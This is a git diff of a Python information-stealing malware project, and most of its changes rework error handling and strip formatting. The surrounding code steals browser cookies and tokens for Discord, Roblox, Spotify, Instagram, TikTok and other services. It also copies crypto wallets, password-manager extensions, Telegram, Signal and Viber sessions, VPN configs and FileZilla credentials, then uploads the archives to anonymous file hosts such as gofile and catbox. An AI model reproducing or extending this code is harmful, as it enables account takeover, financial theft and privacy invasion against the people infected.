@@ -330,7 +330,7 @@ class get_data:
                     os.remove(copied_file_path)
                 except:pass  
         except Exception:
-            error_handler()
+            await error_handler()
 
 
 
@@ -355,7 +355,7 @@ class get_data:
             mfa = str(response.get("mfa", {}).get("verified", "No MFA Info"))
 
         except Exception:
-            error_handler()
+            await error_handler()
         else:
             ListFonction.RiotGames.append(f"Username: {username}\nEmail: {email}\nRegion: {region}\nLocale: {locale}\nCountry: {country}\nMFA Verified: {mfa}\nBrowser: {browser}\nCookie: {cookie}")
 
@@ -405,7 +405,7 @@ class get_data:
             followers = data["data"]["user"]["followers"]["totalCount"]            
 
         except Exception:
-            error_handler()
+            await error_handler()
         else:
             ListFonction.TwitchAccounts.append(f"ID: {idd}\nLogin: {login}\nDisplay Name: {displayName}\nEmail: {email}\nHas Prime: {hasPrime}\nIs Partner: {isPartner}\nLanguage: {lang}\nBits Balance: {bits}\nFollowers: {followers}\nProfile URL: {acc_url}\nBrowser: {browser}\nAuth Token: {auth_token}")
 
@@ -424,14 +424,14 @@ class get_data:
                     if response.status == 200:
                         data = await response.json()
                     else:
-                        error_handler(f"Spotify Failed to fetch data from {url}: {response.status}")
+                        await error_handler()
                         return
 
                 async with session.get(url2, headers=headers) as response:
                     if response.status == 200:
                         data2 = await response.json()
                     else:
-                        error_handler(f"Spotify Failed to fetch data from {url2}: {response.status}")
+                        await error_handler()
                         return
 
             email = data["profile"]["email"]
@@ -451,7 +451,7 @@ class get_data:
             ListFonction.SpotifyAccount.append(f"Browser: {browser}\nEmail: {email}\nGender: {gender}\nBirthdate: {birthdate}\nCountry: {country}\nThird Party Email: {third}\nUsername: {username}\nIsTrial: {istrial}\nCurrentPlan: {plan}\nIsRecurring: {isrecurring}\nDaysLeft: {daysleft}\nIsSub: {sub}\nBilling Info: {billing}\nExpiry: {expiry}\n==============================================\n")
 
         except Exception:
-            error_handler()
+            await error_handler()
 
 
     async def StealReddit(self, cookie, browser: str) -> None:
@@ -474,7 +474,7 @@ class get_data:
                 suspended = data2.get("is_suspended", "No suspension status")
 
         except Exception:
-            error_handler()
+            await error_handler()
         else:
             ListFonction.RedditAccounts.append(f"Username: {username}\nEmail: {gmail}\nProfile URL: {profileUrl}\nComment Karma: {commentKarma}\nTotal Karma: {totalKarma}\nCoins: {coins}\nMod Status: {mod}\nGold Status: {gold}\nSuspended: {suspended}\nBrowser: {browser}\nCookie: {cookie}")
 
@@ -504,7 +504,7 @@ class get_data:
             social_connection_names = "\n".join([f"{key.capitalize()}" for key in non_null_social_connections]) if non_null_social_connections else "No connections"
 
         except Exception:
-            error_handler()
+            await error_handler()
         else:
             ListFonction.PatreonAccounts.append(f"Email: {email}\nVerified: {verified}\nCreated: {created}\nCurrency: {currency}\nBio: {bio}\nSocial Connections:\n{social_connection_names}\nProfile URL: {url}\nAdditional URL: {url2}\nBrowser: {browser}\nCookie: {cookie}")
 
@@ -532,7 +532,7 @@ class get_data:
             bio = data["user"]["aboutInfo"].get("tagLine", "Couldn't get user bio")
 
         except Exception:
-            error_handler()
+            await error_handler()
         else:
             ListFonction.GuildedAccounts.append(f"Username: {username}\nGlobal Username: {globalusername}\nEmail: {email}\nUser ID: {ids}\nJoin Date: {join}\nBio: {bio}\nSocial Links:\n{formatted_social_links}\nBrowser: {browser}\nCookie: {cookie}")
 
@@ -565,7 +565,7 @@ class get_data:
             following = data2["user"].get("following_count", 0)
 
         except Exception:
-            error_handler()
+            await error_handler()
         else:
             ListFonction.InstagramAccounts.append(f"Username: {username}\nFull Name: {fullname}\nEmail: {email}\nIs Verified: {'Yes' if verify else 'No'}\nFollowers: {followers}\nFollowing: {following}\nBio: {bio}\nProfile URL: {profileURL}\nBrowser: {browser}\nCookie: {cookie}")
 
@@ -592,13 +592,13 @@ class get_data:
                     data3 = await (await session.get(url3, headers=headers)).json()
                     subscriber = data3.get("total", "0")
                 except Exception:
-                    error_handler()
+                    await error_handler()
                     subscriber = "0"
 
                 formatted_date = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(timestamp))
 
         except Exception:
-            error_handler()
+            await error_handler()
             pass
         else:
             ListFonction.TikTokAccounts.append(f"User ID: {user_id}\nUsername: {username}\nEmail: {email}\nPhone: {phone}\nCoins: {coins}\nCreated At: {formatted_date}\nSubscribers: {subscriber}\nBrowser: {browser}\nCookie: {cookie}\n")
@@ -632,7 +632,7 @@ class get_data:
                 profileURL = f"https://twitter.com/{nickname}"
             
         except Exception:
-            error_handler()
+            await error_handler()
         else:
             ListFonction.TwitterAccounts.append(f"Username: {username}\nScreen Name: {nickname}\nFollowers: {followers_count}\nFollowing: {following_count}\nTweets: {tweets_count}\nIs Verified: {'Yes' if verified else 'No'}\nCreated At: {created_at}\nBiography: {description}\nProfile URL: {profileURL}\nCookie: {cookie}\nBrowser: {browser}")
     async def StealRoblox(self, cookie, browser) -> None:
@@ -668,7 +668,7 @@ class get_data:
                     else:
                         raise ValueError("No 'data' key in the response.")
                 except Exception:
-                    error_handler()
+                    await error_handler()
                     return []
 
             async def GetRAP(UserID):
@@ -698,7 +698,7 @@ class get_data:
                             Done = True
                                     
                     except Exception:
-                        error_handler()
+                        await error_handler()
                         Done = True
                 return TotalValue
 
@@ -733,7 +733,7 @@ class get_data:
             days_passed = round(seconds_passed / (24 * 60 * 60))
 
         except Exception:
-            error_handler()
+            await error_handler()
         else:
             ListFonction.RobloxAccounts.append(f"Cookie: {cookie}\nBrowser: {browser}\nUser: {username} ({userId})\nThumbail: {thumbnail}\nRobux: {robux}\nPremium: {premium}\nCreation Date: {creationDate} / {days_passed} Days!\nDescription: {description}\nBanned: {banned}\nRAP: {rap}\nFriends List: \n{friendlist}\n==============================================\n")
             
@@ -816,19 +816,20 @@ class get_data:
                                 file_name = f"{os.path.basename(ext_path)} {wallet_name}"
                                 dest_path = os.path.join(wallet_dir, file_name)
                                 shutil.copytree(wallet_path, dest_path)
-                            except Exception as e:
-                                error_handler(f"Error copying wallet '{wallet_name}': {type(e).__name__} - {str(e)}")
+                            except Exception:
+                                await error_handler()
+
 
             for wallet_name, wallet_path in wallet_local_paths.items():
                 try:
                     if os.path.exists(wallet_path):
                         dest_path = os.path.join(wallet_dir, wallet_name)
                         shutil.copytree(wallet_path, dest_path)
-                except Exception as e:
-                    error_handler(f"Error copying wallet '{wallet_name}': {type(e).__name__} - {str(e)}")
+                except Exception:
+                    await error_handler()
 
-        except Exception as e:
-            error_handler(f"An error occurred: {type(e).__name__} - {str(e)}")
+        except Exception:
+            await error_handler()
 
     async def StealTelegramSession(self, directory_path: str) -> None:
         try:
@@ -852,15 +853,15 @@ class get_data:
                                 shutil.copyfile(_path, os.path.join(copy_path, dirs))
                             elif os.path.isdir(_path):
                                 shutil.copytree(_path, os.path.join(copy_path, dirs))
-                    except Exception as e:
-                        error_handler(f"An error occurred while copying {dirs}: {type(e).__name__} - {str(e)}")
+                    except Exception:
+                        await error_handler()
                         continue
 
                 if len(os.listdir(copy_path)) == 0:
                     os.rmdir(copy_path)
 
-        except Exception as e:
-            error_handler(f"An error occurred in StealTelegramSession: {type(e).__name__} - {str(e)}")
+        except Exception:
+            await error_handler()
             pass
 
 
@@ -886,9 +887,8 @@ class get_data:
                         os.makedirs(dest_folder, exist_ok=True)
                         shutil.copy(file, dest_folder)
                         
-            print('[+] StealWhatsApp Finished')
-        except Exception as e:
-            error_handler(f"An error occurred: {type(e).__name__} - {str(e)}")
+        except Exception:
+            await error_handler()
             pass
 
     async def StealSkype(self, directory_path: str) -> None:
@@ -903,8 +903,8 @@ class get_data:
                 if len(os.listdir(copy_path)) == 0:
                     os.rmdir(copy_path)
                 
-        except Exception as e:
-            error_handler(f"An error occurred: {type(e).__name__} - {str(e)}")
+        except Exception:
+            await error_handler()
             pass
 
     async def StealSignal(self, directory_path: str) -> None:
@@ -921,14 +921,14 @@ class get_data:
                         shutil.copytree(Path(signal_path) / "attachments.noindex", os.path.join(copied_path, "attachments.noindex"))
                     if os.path.exists(Path(signal_path) / "config.json"):
                         shutil.copy(Path(signal_path) / "config.json", copied_path)
-                except Exception as e:
-                    error_handler(f"An error occurred: {type(e).__name__} - {str(e)}")
+                except Exception:
+                    await error_handler()
                     pass
                 if len(os.listdir(copied_path)) == 0:
                     os.rmdir(copied_path)
 
-        except Exception as e:
-            error_handler(f"An error occurred: {type(e).__name__} - {str(e)}")
+        except Exception:
+            await error_handler()
             pass
  
     async def StealElement(self, directory_path: str) -> None:
@@ -947,8 +947,8 @@ class get_data:
                     if os.path.exists(local_storage_src):
                         shutil.copytree(local_storage_src, os.path.join(copied_path, "Local Storage"))
                     found_element = True
-                except Exception as e:
-                    error_handler(f"An error occurred: {type(e).__name__} - {str(e)}")
+                except Exception:
+                    await error_handler()
                     pass
                 if found_element:
                     os.mkdir(os.path.join(copied_path, "How to Use"))
@@ -956,8 +956,8 @@ class get_data:
                         write_file.write("First, open this file path on your computer <%appdata%\\Element>.\nDelete all the files here, then copy the stolen files to this folder.\nAfter all this run Element")
                 if len(os.listdir(copied_path)) == 0:
                     os.rmdir(copied_path)
-        except Exception as e:
-            error_handler(f"An error occurred: {type(e).__name__} - {str(e)}")
+        except Exception:
+            await error_handler()
             pass 
    
     async def StealViber(self, directory_path: str) -> None:
@@ -989,8 +989,8 @@ class get_data:
                         write_file.write("First, open this file path on your computer <%appdata%\\ViberPC>.\nDelete all the files here, then copy the stolen files to this folder.\nAfter all this run Viber")
                 if len(os.listdir(copied_path)) == 0:
                     os.rmdir(copied_path)
-        except Exception as e:
-            error_handler(f"An error occurred: {type(e).__name__} - {str(e)}")
+        except Exception:
+            await error_handler()
             pass
   
 
@@ -1006,8 +1006,8 @@ class get_data:
                     shutil.copy2(pidgin_folder, pidgin_accounts)
                 if len(os.listdir(pidgin_accounts)) == 0:
                     os.rmdir(pidgin_accounts)
-        except Exception as e:
-            error_handler(f"An error occurred: {type(e).__name__} - {str(e)}")
+        except Exception:
+            await error_handler()
             pass
 
     async def StealTox(self, directory_path: str) -> None:
@@ -1023,8 +1023,8 @@ class get_data:
                         shutil.copy2(item, tox_session)
                 if len(os.listdir(tox_session)) == 0:
                     os.rmdir(tox_session)
-        except Exception as e:
-            error_handler(f"An error occurred: {type(e).__name__} - {str(e)}")
+        except Exception:
+            await error_handler()
             pass
 
     async def StealProtonVPN(self, directory_path: str) -> None:
@@ -1045,8 +1045,8 @@ class get_data:
                     shutil.copytree(directory, destination_path, dirs_exist_ok=True)
                 else:
                     shutil.copy2(directory, destination_path)
-        except Exception as e:
-            error_handler(f"An error occurred: {type(e).__name__} - {str(e)}")
+        except Exception:
+            await error_handler()
             pass
 
     async def StealSurfsharkVPN(self, directory_path: str) -> None:
@@ -1062,8 +1062,8 @@ class get_data:
                 for file in files:
                     if file in files_to_copy:
                         shutil.copy2(os.path.join(root, file), surfsharkvpn_account)
-        except Exception as e:
-            error_handler(f"An error occurred: {type(e).__name__} - {str(e)}")
+        except Exception:
+            await error_handler()
             pass
 
     async def StealOpenVPN(self, directory_path: str) -> None:
@@ -1086,8 +1086,8 @@ class get_data:
                 shutil.copytree(Path(config_src), openvpn_accounts, dirs_exist_ok=True)
             else:
                 shutil.copy2(Path(config_src), openvpn_accounts)
-        except Exception as e:
-            error_handler(f"An error occurred: {type(e).__name__} - {str(e)}")
+        except Exception:
+            await error_handler()
             pass
 
     async def BackupThunderbird(self, directory_path: str) -> None:
@@ -1118,8 +1118,8 @@ class get_data:
                             shutil.copytree(file, dest_file_path, dirs_exist_ok=True)
                         else:
                             shutil.copy2(file, dest_file_path)
-        except Exception as e:
-            error_handler(f"An error occurred: {type(e).__name__} - {str(e)}")
+        except Exception:
+            await error_handler()
             pass
 
 
@@ -1137,8 +1137,8 @@ class get_data:
             else:
                 shutil.copy2(Path(store_db), mailbird_db)
     
-        except Exception as e:
-            error_handler(f"An error occurred: {type(e).__name__} - {str(e)}")
+        except Exception:
+            await error_handler()
             pass
 
     async def StealFileZilla(self, directory_path: str) -> None:
@@ -1182,8 +1182,8 @@ class get_data:
                 
             if len(os.listdir(filezilla_hosts)) == 0:
                 os.rmdir(filezilla_hosts)
-        except Exception as e:
-            error_handler(f"An error occurred: {type(e).__name__} - {str(e)}")
+        except Exception:
+            await error_handler()
             pass
 
 
@@ -1240,15 +1240,15 @@ class get_data:
                             break
                         index += 1
             except OSError:
-                error_handler()
+                await error_handler()
 
             with open(output_path, 'w') as file:
                 file.write(output)
 
         except OSError:
-            error_handler()
+            await error_handler()
         except Exception:
-            error_handler()
+            await error_handler()
 
 
     async def StealPasswordManagers(self, directory_path: str) -> None:
@@ -1267,7 +1267,6 @@ class get_data:
             }
 
             password_mgr_dirs = {
-                "bhghoamapcdpbohphigoooaddinpkbai": "Authenticator",
                 "aeblfdkhhhdcdjpifhhbdiojplfjncoa": "1Password",
                 "eiaeiblijfjekdanodkjadfinkhbfgcd": "NordPass",
                 "fdjamakpfbbddfjaooikfcpapjohcfmg": "DashLane",
@@ -1297,11 +1296,11 @@ class get_data:
                                         shutil.copy2(Path(extension_path), password_dir_path)
                                     location_file = os.path.join(password_dir_path, "Location.txt")
                                     with open(location_file, 'w') as loc_file:
-                                        loc_file.write(f"[!] Copied {password_manager} from {extension_path} to {password_dir_path}")
+                                        loc_file.write(f"Copied {password_manager} from {extension_path} to {password_dir_path}")
             if len(os.listdir(password_dir_path)) == 0:
                 os.rmdir(password_dir_path)
-        except Exception as e:
-            error_handler(f"An error occurred: {type(e).__name__} - {str(e)}")
+        except Exception:
+            await error_handler()
 
 
 
@@ -1314,17 +1313,17 @@ class get_data:
     async def StealDiscord(self) -> None:
         try:
             baddglist = [
-                {"N": 'Active_Developer', 'V': 4194304, 'E': '<:active:1045283132796063794> '},
-                {"N": 'Early_Verified_Bot_Developer', 'V': 131072, 'E': "<:developer:874750808472825986> "},
-                {"N": 'Bug_Hunter_Level_2', 'V': 16384, 'E': "<:bughunter_2:874750808430874664> "},
-                {"N": 'Early_Supporter', 'V': 512, 'E': "<:early_supporter:874750808414113823> "},
-                {"N": 'House_Balance', 'V': 256, 'E': "<:balance:874750808267292683> "},
-                {"N": 'House_Brilliance', 'V': 128, 'E': "<:brilliance:874750808338608199> "},
-                {"N": 'House_Bravery', 'V': 64, 'E': "<:bravery:874750808388952075> "},
-                {"N": 'Bug_Hunter_Level_1', 'V': 8, 'E': "<:bughunter_1:874750808426692658> "},
-                {"N": 'HypeSquad_Events', 'V': 4, 'E': "<:hypesquad_events:874750808594477056> "},
-                {"N": 'Partnered_Server_Owner', 'V': 2, 'E': "<:partner:874750808678354964> "},
-                {"N": 'Discord_Employee', 'V': 1, 'E': "<:staff:874750808728666152> "}
+                {"N": 'Active_Developer', 'V': 4194304, 'E': 'Active Developer '},
+                {"N": 'Early_Verified_Bot_Developer', 'V': 131072, 'E': "Verified Bot Developer "},
+                {"N": 'Bug_Hunter_Level_2', 'V': 16384, 'E': "Bug Hunter Lvl 2 "},
+                {"N": 'Early_Supporter', 'V': 512, 'E': "Early Supporter "},
+                {"N": 'House_Balance', 'V': 256, 'E': "House Balance "},
+                {"N": 'House_Brilliance', 'V': 128, 'E': "House Brilliance "},
+                {"N": 'House_Bravery', 'V': 64, 'E': "House Bravery "},
+                {"N": 'Bug_Hunter_Level_1', 'V': 8, 'E': "Bug Hunter Lvl 1 "},
+                {"N": 'HypeSquad_Events', 'V': 4, 'E': "HypeSquad "},
+                {"N": 'Partnered_Server_Owner', 'V': 2, 'E': "Partnered Server Owner "},
+                {"N": 'Discord_Employee', 'V': 1, 'E': "Discord Employee "}
             ]
 
             async def UhqGuild(token) -> str:
@@ -1348,12 +1347,12 @@ class get_data:
 
                         link = invites[0]['code'] if invites else None
 
-                        uhq.append(f"⚔️ [{guild['name']}]({f'https://discord.gg/{link}' if link else ''}) `({guild['id']})` **{guild['approximate_member_count']} Members**")
+                        uhq.append(f"[{guild['name']}]({f'https://discord.gg/{link}' if link else ''}) ({guild['id']}) {guild['approximate_member_count']} Members")
 
-                    return '\n'.join(uhq) if uhq else "`No HQ Guilds`"
-                except Exception as e:
-                    error_handler(f"UhqGuild An error occurred: {type(e).__name__} - {str(e)}")
-                    return "`No HQ Guilds`"
+                    return '\n'.join(uhq) if uhq else "No HQ Guilds"
+                except Exception:
+                    await error_handler()
+                    return "No HQ Guilds"
 
 
             async def GetUhqFriend(token, max_friends=5) -> str:
@@ -1382,10 +1381,10 @@ class get_data:
                                     OwnedBadges += badge["E"]
                                 flags = flags % badge["V"]
                         if OwnedBadges != '':
-                            uhqlist += f"{OwnedBadges} | **{friend['user']['username']}#{friend['user']['discriminator']}** `({friend['user']['id']})`\n"
-                    return uhqlist if uhqlist != '' else "`No HQ Friends`"
-                except Exception as e:
-                    error_handler(f"GetUhqFriend An error occurred: {type(e).__name__} - {str(e)}")
+                            uhqlist += f"{OwnedBadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
+                    return uhqlist if uhqlist != '' else "No HQ Friends"
+                except Exception:
+                    await error_handler()
 
             def GetBadge(flags):
                 if flags == 0:
@@ -1411,14 +1410,17 @@ class get_data:
                             user_info = await response.json()
 
                     username = user_info["username"]
+
                     globalusername = 'None'
                     if "global_name" in user_info:
                         globalusername = user_info["global_name"]
+
                     bio = "None"
                     if "bio" in user_info:
                         bio = user_info["bio"]
                         if len(bio) > 70:
                             bio = bio[:67] + "..."
+
                     nsfw = ""
                     if "nsfw_allowed" in user_info:
                         nsfw = user_info["nsfw_allowed"]
@@ -1430,7 +1432,6 @@ class get_data:
                     hashtag = user_info["discriminator"]
                     email = user_info.get(f"email", "")
                     user_id = user_info["id"]
-                    pfp = user_info["avatar"]
 
                     flags = user_info[f"public_flags"]
                     nitros = "No Nitro"
@@ -1448,9 +1449,9 @@ class get_data:
                     if "phone" in user_info:
                         phone = f'`{user_info["phone"]}`'
 
-                    return username, globalusername, bio, nsfw, hashtag, email, user_id, pfp, flags, nitros, phone
-                except Exception as e:
-                    error_handler(f"GetTokenInfo An error occurred: {type(e).__name__} - {str(e)}")
+                    return username, globalusername, bio, nsfw, hashtag, email, user_id, flags, nitros, phone
+                except Exception:
+                    await error_handler()
 
 
             async def CheckToken(token) -> bool:
@@ -1459,6 +1460,7 @@ class get_data:
                     "Content-Type": "application/json",
                     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
                 }
+
                 url = "https://discord.com/api/v6/users/@me"
                 try:
                     async with aiohttp.ClientSession() as session:
@@ -1467,8 +1469,8 @@ class get_data:
                                 return False
                             else:
                                 return True
-                except Exception as e:
-                    print(f"CheckToken An error occurred: {type(e).__name__} - {str(e)}")
+                except Exception:
+                    await error_handler()
                     return False
 
             async def GetBilling(token):
@@ -1478,14 +1480,16 @@ class get_data:
                         "Content-Type": "application/json",
                         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
                     }
+
                     url = "https://discord.com/api/users/@me/billing/payment-sources"
                     try:
                         async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                             async with session.get(url, headers=headers) as response:
                                 response_text = await response.text()
                                 billing_json = json.loads(response_text)
-                    except Exception as e:
-                        print(f"GetBilling Error - {str(e)}")
+
+                    except Exception:
+                        await error_handler()
                         return False
                     
                     if not billing_json:
@@ -1501,24 +1505,21 @@ class get_data:
                             elif method["type"] == 17:
                                 billing += "CashApp "
                     return billing
-                except Exception as e:
-                    error_handler(f"GetBilling An error occurred: {type(e).__name__} - {str(e)}")
-
-            processed_tokens = []
+                except Exception:
+                    await error_handler()
 
             async def GetBack() -> None:
                 try:
                     path = os.environ["HOMEPATH"]
                     code_path = '\\Downloads\\discord_backup_codes.txt'
-                    full = path + code_path
                     if os.path.exists(path + code_path):
                         with open(path + code_path, 'r', encoding='utf-8') as file:
                             backup = file.readlines()
                             
                         return backup
                             
-                except Exception as e:
-                    error_handler(f"GetBack An error occurred: {type(e).__name__} - {str(e)}")
+                except Exception:
+                    await error_handler()
                     return 'No backup code saved'
                 
             async def GetDiscordConnection(token) -> None:
@@ -1526,18 +1527,44 @@ class get_data:
                     headers = {
                         "Authorization": token,
                         "Content-Type": "application/json",
-                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",}
+                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+                    }
+
                     async with aiohttp.ClientSession() as session:
                         async with session.get("https://discord.com/api/v6/users/@me/connections", headers=headers) as response:
                             if response.status == 200:
                                 data = await response.json()
-                                Services = {"battlenet": "https://battle.net","ebay": "https://ebay.com","epicgames": "https://epicgames.com","facebook": "https://facebook.com","github": "https://github.com","instagram": "https://instagram.com","leagueoflegends": "https://leagueoflegends.com","paypal": "https://paypal.com","playstation": "https://playstation.com","reddit": "https://reddit.com","riotgames": "https://riotgames.com","spotify": "https://spotify.com","skype": "https://skype.com","steam": "https://store.steampowered.com","tiktok": "https://tiktok.com","twitch": "https://twitch.tv","twitter": "https://twitter.com","xbox": "https://xbox.com","youtube": "https://youtube.com",}
+
+                                Services = {
+                                    "battlenet": "https://battle.net",
+                                    "ebay": "https://ebay.com",
+                                    "epicgames": "https://epicgames.com",
+                                    "facebook": "https://facebook.com",
+                                    "github": "https://github.com",
+                                    "instagram": "https://instagram.com",
+                                    "leagueoflegends": "https://leagueoflegends.com",
+                                    "paypal": "https://paypal.com",
+                                    "playstation": "https://playstation.com",
+                                    "reddit": "https://reddit.com",
+                                    "riotgames": "https://riotgames.com",
+                                    "spotify": "https://spotify.com",
+                                    "skype": "https://skype.com",
+                                    "steam": "https://store.steampowered.com",
+                                    "tiktok": "https://tiktok.com",
+                                    "twitch": "https://twitch.tv",
+                                    "twitter": "https://twitter.com",
+                                    "xbox": "https://xbox.com",
+                                    "youtube": "https://youtube.com"
+                                }
+
                                 connections_list = []
-                                for connection in data:connections_list.append(f"☂️ Username : `{connection['name']}`\n🌐 Services : [{connection['type']}]({Services.get(connection['type'], 'Unknown')})\n")
+                                for connection in data:
+                                    connections_list.append(f"Username: {connection['name']}\nServices : [{connection['type']}]({Services.get(connection['type'], 'Unknown')})\n")
                                 return connections_list
-                            else:return []
-                except Exception as e:
-                    error_handler(f"GetDiscordConnection An error occurred: {type(e).__name__} - {str(e)}")
+                            else:
+                                return []
+                except Exception:
+                    await error_handler()
         
             async def GetGift(token) -> None:
                 try:
@@ -1550,25 +1577,30 @@ class get_data:
                                     for code in gift_codes:
                                         name = code['promotion']['outbound_title']
                                         code_value = code['code']
-                                        data = f":gift: `{name}`\n:key: `{code_value}`"
+                                        data = f"Name: {name}\nCode: {code_value}"
                                         codes.append(data)
                                     return '\n\n'.join(codes) if codes else 'No Gift'
-                                else:return 'No Gift'
-                            else:return 'No Gift'
-                except Exception as e:
-                    error_handler(f"GetGift An error occurred: {type(e).__name__} - {str(e)}")
-                    
+                                else:
+                                    return 'No Gift'
+                            else:
+                                return 'No Gift'
+                except Exception:
+                    await error_handler()
             processed_tokens = []
             processed_id = []
             async def UploadToken(token, path) -> None:
                 try:
-                    print('[+] UploadToken Started')
-                    if token in processed_tokens:return
+                    if token in processed_tokens:
+                        return
+                    
                     processed_tokens.append(token)
-                    username, globalusername, bio, nsfw, hashtag, email, user_id, pfp, flags, nitro, phone = await GetTokenInfo(token)
-                    if user_id in processed_id:return
+                    username, globalusername, bio, nsfw, hashtag, email, user_id, flags, nitro, phone = await GetTokenInfo(token)
+                
+                    if user_id in processed_id:
+                        return
+                 
                     processed_id.append(user_id)                    
-                    pfp = f"https://cdn.discordapp.com/avatars/{user_id}/{pfp}" if pfp else "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png"                    
+                 
                     back = await GetBack()
                     billing = await GetBilling(token)
                     badge = GetBadge(flags)
@@ -1576,16 +1608,24 @@ class get_data:
                     guild = await UhqGuild(token)
                     gift = await GetGift(token)
                     connections = await GetDiscordConnection(token)
-                    if isinstance(connections, list):connections_str = "\n".join(connections) if connections else 'No Connections'
-                    else:connections_str = 'No Connections'
-                    if friends == '':friends = "No Rare Friends"
-                    if not billing:billing = "No Billing"
-                    if not badge:badge = "No Badge"
-                    if not phone: phone = "No Phone"
-                    if hashtag == '0':hashtag = ''
+
+                    if isinstance(connections, list):
+                        connections_str = "\n".join(connections) if connections else 'No Connections'
+                    else:
+                        connections_str = 'No Connections'
+                    if friends == '':
+                        friends = "No Rare Friends"
+                    if not billing:
+                        billing = "No Billing"
+                    if not badge:
+                        badge = "No Badge"
+                    if not phone: 
+                        phone = "No Phone"
+                    if hashtag == '0':
+                        hashtag = ''
                     
                 except Exception:
-                    error_handler()
+                    await error_handler()
                 else:
                     ListFonction.discord.append(f"Token: {token}\nPath: {path}\nUser: {username}#{hashtag} ({user_id}) Global Username : {globalusername}\nPhone: {phone}\nEmail: {email}\nNsfw Enable?: {nsfw}\nBadge: {nitro}{badge}\nBilling: {billing}\nBiography: {bio}\nHQ Friends: {friends}\nGuilds: {guild}\nConnection: {connections_str}\nGift: {gift}\nBackup Code: {back}\n==============================================\n")
 
@@ -1610,7 +1650,7 @@ class get_data:
                                                     await UploadToken(token, path)
 
                 except Exception:
-                    error_handler()
+                    await error_handler()
 
             async def GetDiscord(path, arg):
                 try:
@@ -1638,7 +1678,7 @@ class get_data:
                                                 await UploadToken(TokenDecoded, path)
 
                 except Exception:
-                    error_handler()
+                    await error_handler()
 
             browserPaths = [        
                 [f"{self.RoamingAppData}/Opera Software/Opera GX Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
@@ -1669,10 +1709,10 @@ class get_data:
                 for patt in discordPaths:
                     await GetDiscord(patt[0], patt[1])
             except Exception:
-                error_handler()
+                await error_handler()
 
         except Exception:
-            error_handler()
+            await error_handler()
 
 
 
@@ -1832,12 +1872,12 @@ class get_data:
                 try:
                     if len(os.listdir(os.path.join(filePath, folder))) == 0:
                         shutil.rmtree(os.path.join(filePath, folder))
-                except Exception as e:
-                    error_handler(f"Error while removing {folder} directory: {e}")
+                except Exception:
+                    await error_handler()
 
 
         except Exception:
-            error_handler()
+            await error_handler()
 
     async def SendKeyWords(self) -> None:
         try:
@@ -1878,8 +1918,8 @@ class get_data:
                 async with session.post(send, data=message_payload) as response:
                     pass
 
-        except Exception as e:
-            error_handler(f"An error occurred: {type(e).__name__} - {str(e)}")
+        except Exception:
+            await error_handler()
 
     async def SendAllData(self) -> None:
         try:
@@ -1951,11 +1991,11 @@ class get_data:
                 os.remove(filePath + ".zip")
                 shutil.rmtree(filePath)
 
-            except Exception as e:
-                error_handler(f"An error occurred: {type(e).__name__} - {str(e)}")
+            except Exception:
+                await error_handler()
 
-        except Exception as e:
-            error_handler(f"An error occurred: {type(e).__name__} - {str(e)}")
+        except Exception:
+            await error_handler()
         
 
 class UploadFiles:
@@ -1966,8 +2006,8 @@ class UploadFiles:
                 async with session.get("https://api.gofile.io/getServer") as request:
                     data = await request.json()
                     return data["data"]["server"]
-        except aiohttp.ClientError as e:
-            error_handler(f"An error occurred while fetching GoFile server: {type(e).__name__} - {str(e)}")
+        except Exception:
+            await error_handler()
             return "store1"
 
     @staticmethod
@@ -1983,8 +2023,8 @@ class UploadFiles:
                     async with session.post(f'https://{server}.gofile.io/uploadFile', data=form) as response:
                         data = await response.json()
                         return data["data"]["downloadPage"]
-        except Exception as e:
-            error_handler(f"An error occurred with GoFile (aiohttp): {e}")
+        except Exception:
+            await error_handler()
             return None
 
     @staticmethod
@@ -2000,8 +2040,8 @@ class UploadFiles:
                     async with session.post('https://catbox.moe/user/api.php', data=form) as response:
                         result = await response.text()
                         return result
-        except Exception as e:
-            error_handler(f"An error occurred while uploading to Catbox: {type(e).__name__} - {str(e)}")
+        except Exception:
+            await error_handler()
             return None
 
     @staticmethod
@@ -2017,10 +2057,10 @@ class UploadFiles:
                             data = await response.json()
                             return data.get("link")
                         else:
-                            error_handler(f"File.io upload failed with status: {response.status}")
+                            await error_handler()
                             return None
-        except Exception as e:
-            error_handler(f"An error occurred while uploading to File.io: {type(e).__name__} - {str(e)}")
+        except Exception:
+            await error_handler()
             return None
 
     @staticmethod
@@ -2034,8 +2074,8 @@ class UploadFiles:
                     async with session.post('https://uguu.se/api.php?d=upload', data=form) as response:
                         data = await response.json()
                         return data.get("url")
-        except Exception as e:
-            error_handler(f"An error occurred while uploading to Uguu: {type(e).__name__} - {str(e)}")
+        except Exception:
+            await error_handler()
             return None
 
     @staticmethod
@@ -2049,8 +2089,8 @@ class UploadFiles:
                     async with session.post('https://api.anonfiles.com/upload', data=form) as response:
                         data = await response.json()
                         return data["data"]["file"]["url"]["full"]
-        except Exception as e:
-            error_handler(f"An error occurred while uploading to AnonFiles: {type(e).__name__} - {str(e)}")
+        except Exception:
+            await error_handler()
             return None
 
     @staticmethod
@@ -2068,8 +2108,8 @@ class UploadFiles:
                 result = await upload_method(file_path)
                 if result:
                     return result
-            except Exception as e:
-                error_handler(f"An error occurred with {platform}: {type(e).__name__} - {str(e)}")
+            except Exception:
+                await error_handler()
                 continue
         
         return "All upload attempts failed."
@@ -2092,7 +2132,7 @@ class InfoStealer:
         process = await asyncio.create_subprocess_shell(command,stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE,shell=True)
         stdout, stderr = await process.communicate()
         if stderr:
-            error_handler(f"Command error: {stderr.decode(errors='ignore')}")
+            await error_handler()
